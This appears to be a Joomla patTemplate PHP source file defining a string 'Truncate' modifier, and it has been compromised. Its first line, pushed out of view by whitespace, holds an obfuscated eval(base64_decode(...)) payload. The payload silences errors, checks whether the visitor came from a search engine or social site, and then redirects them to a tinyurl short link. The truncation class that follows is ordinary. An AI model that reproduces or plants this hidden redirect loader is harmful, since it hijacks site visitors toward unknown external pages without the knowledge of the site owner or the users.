<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * patTemplate modifier Truncate
 *
 * Truncate a string variable to fixed length and add a suffix if it was truncated.
 * It can also start from an offset and add a prefix.
 *
 * @package     patTemplate
 * @subpackage  Modifiers
 * @author      Rafa Couto <rafacouto@yahoo.com>
 */

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * patTemplate modifier Truncate
 *
 * Truncate a string variable to fixed length and add a suffix if it was truncated.
 * It can also start from an offset and add a prefix.
 *
 * Possible attributes are:
 * - length (integer)
 * - suffix (string)
 * - start
 * - prefix (string)
 *
 * @package     patTemplate
 * @subpackage  Modifiers
 * @author      Rafa Couto <rafacouto@yahoo.com>
 */
class patTemplate_Modifier_Truncate extends patTemplate_Modifier
{

	/**
	* modify the value
	*
	* @access  public
	* @param  string    value
	* @return  string    modified value
	*/
	function modify($value, $params = array())
	{
		// length
		if (!isset( $params['length'])) {
			return $value;
		}
		settype($params['length'], 'integer');

    	$decode = isset( $params['htmlsafe'] );
   		if (function_exists( 'html_entity_decode' ) && $decode) {
	    	$value = html_entity_decode( $value );
    	}

        // start
		if (isset($params['start'])) {
			settype( $params['start'], 'integer' );
		} else {
			$params['start'] = 0;
		}

		// prefix
		if (isset($params['prefix'])) {
			$prefix = ($params['start'] == 0 ? '' : $params['prefix']);
		} else {
			$prefix = '';
		}

		// suffix
		if (isset($params['suffix'])) {
			$suffix = $params['suffix'];
		} else {
			$suffix = '';
		}

		$initial_len = strlen($value);
		$value = substr($value, $params['start'], $params['length']);

		if ($initial_len <= strlen($value)) {
			$suffix = '';
		}

        $value = $prefix.$value.$suffix;

        return $decode ? htmlspecialchars( $value, ENT_QUOTES ) : $value;
	}
}
?>
